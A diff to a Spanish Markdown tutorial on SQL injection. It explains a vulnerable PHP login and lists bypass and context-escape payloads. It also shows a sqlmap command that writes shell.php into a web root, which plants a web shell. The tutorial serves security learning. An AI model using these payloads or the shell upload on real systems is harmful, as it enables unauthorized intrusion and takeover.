@@ -1,46 +1,50 @@
-## ¿qué es una sqli inyection?
+## ❓ ¿Qué es una SQL Injection?
 
-Una SQL Injection es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a su base de datos.
+Una **SQL Injection** es un tipo de ataque que ocurre cuando un atacante es capaz de "inyectar" código SQL malicioso en una consulta que se envía a la base de datos.
 
 👉 En otras palabras: el atacante logra manipular las consultas a la base de datos para que hagan cosas no deseadas, como:
 
-  obtener datos confidenciales,
+- obtener datos confidenciales,
+- modificar o eliminar datos,
+- saltarse controles de autenticación,
+- ejecutar comandos administrativos en la base de datos.
 
-  modificar o eliminar datos,
+## 📌 ¿Por qué ocurre?
 
-  saltarse controles de autenticación,
+Sucede cuando una aplicación web **no valida correctamente la entrada del usuario** antes de usarla en una consulta SQL.
 
-  ejecutar comandos administrativos en la base de datos.
+## 🔍 Ejemplo sencillo
 
- ## 📌 ¿Por qué ocurre?
+Supongamos que en una página de login tenemos este código en PHP:
 
- Sucede cuando una aplicación web no valida correctamente la entrada del usuario antes de usarla en una consulta SQL.
-
- 🔍 Ejemplo sencillo
-
-Supongamos que en una página de login tiene este código en PHP:
-```
+```php
 $username = $_POST['username'];
 $password = $_POST['password'];
 
 $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
 ```
-Si el atacante en el campo password escribe:
-```
+
+Si el atacante, en el campo `password`, escribe:
+
+```sql
 ' OR '1'='1
 ```
+
 La consulta que se ejecuta es:
-```
+
+```sql
 SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
 ```
-Como '1'='1' siempre es verdadero, es posible que el atacante logre iniciar sesión sin conocer la contraseña.
 
+Como `'1'='1'` siempre es verdadero, es posible que el atacante logre iniciar sesión **sin conocer la contraseña**.
 
-## 🔍 ¿cómo detectamos si tiene esta vulnerabilidad?
-Cuando vemos campos a rellenar intentaremos inyectar y veremos la respuesta
-lo primero es intentar escapar del contexto actual con:
+## 🔍 ¿Cómo detectamos si existe esta vulnerabilidad?
+
+Cuando vemos campos a rellenar, intentaremos inyectar código y observaremos la respuesta.  
+Lo primero es intentar **escapar del contexto actual** con entradas como:
+
 ```
- [Nothing]
+[Nada]
 '
 "
 `
@@ -51,10 +55,13 @@ lo primero es intentar escapar del contexto actual con:
 "))
 `))
 ```
-y luego corregimos la consulta.
-podemos automatizarlo con diccionarios como seclist que incluye muchos payloads y atendermos a la respuesta.
-las inyecciones más comunes para hacer de forma manual son:
-```
+
+Luego corregimos la consulta.  
+Podemos automatizar esta tarea con diccionarios como [SecLists](https://github.com/danielmiessler/SecLists), que incluyen muchos payloads.
+
+### Inyecciones comunes (manuales)
+
+```sql
 " or 1=1
 " or 1=1#
 " or 1=1--
@@ -205,4 +212,7 @@ sqlmap -u http://<IP> --file-write="shell.php" --file-dest="/var/www/html/shell.
 ```
 
 ---
+
+⚠️ **Advertencia:** estos ataques deben realizarse únicamente en entornos autorizados, con fines educativos o en auditorías de seguridad éticas.
+
 
